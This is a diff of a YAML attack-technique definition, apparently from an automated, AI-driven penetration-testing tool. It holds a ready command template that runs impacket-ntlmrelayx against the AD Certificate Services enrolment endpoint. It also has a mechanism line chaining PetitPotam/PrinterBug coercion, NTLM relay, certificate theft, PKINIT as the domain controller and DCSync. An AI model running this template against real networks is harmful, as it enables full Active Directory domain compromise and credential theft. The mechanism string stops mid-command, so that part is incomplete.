@@ -5,8 +5,7 @@ preconditions:
 - domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-ntlmrelayx -t 'http://{ca_ip}/certsrv/certfnsh.asp' --adcs
-  --template '{template}'
+command_template: impacket-ntlmrelayx -t 'http://{ca_ip}/certsrv/certfnsh.asp' --adcs --template '{template}'
 parser: generic_parser
 expected_effects:
 - relay_to_adcs_success
@@ -15,7 +14,22 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: '**Mechanism**: PetitPotam/PrinterBug coerces DC → relay to HTTP endpoint
-  of ADCS Web Enrolment → request DC certificate using the relayed NetNTLM auth →
-  PKINIT with the resulting cert as DC$ → DCSync. **Command**: `ntlmrelayx.py -t http://CA/certsrv/'
+mechanism: "**Mechanism**: PetitPotam/PrinterBug coerces DC \u2192 relay to HTTP endpoint of ADCS Web Enrolment \u2192 request\
+  \ DC certificate using the relayed NetNTLM auth \u2192 PKINIT with the resulting cert as DC$ \u2192 DCSync. **Command**:\
+  \ `ntlmrelayx.py -t http://CA/certsrv/"
 hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+references:
+  ocd_mindmap_node_ids:
+  - 07650d7a48
+  - 410b17ecc4
+  - 49bb4c7c69
+  - 4a8c25b65d
+  - 4e7ae0f651
+  - 61a3d002ab
+  - 7ce9416a5f
+  - 8f48806198
+  - 9876b802e5
+  - 9dd920c832
+  - bab10c0ce0
+  - bd14897458
+  - c01fb9d65b
